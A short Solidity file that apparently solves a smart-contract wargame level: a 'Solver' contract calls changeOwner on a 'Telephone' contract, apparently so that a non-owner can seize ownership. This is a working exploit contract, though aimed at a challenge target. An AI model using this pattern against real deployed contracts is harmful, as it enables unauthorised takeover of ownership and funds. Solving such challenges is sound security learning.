// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Solver {
	Telephone tele;

	constructor(address _addr) {
        tele = Telephone(_addr);
	}

    function solve(address _owner) public{
        tele.changeOwner(_owner);
    }
}

contract Telephone {
	function changeOwner(address _owner) public {}
}
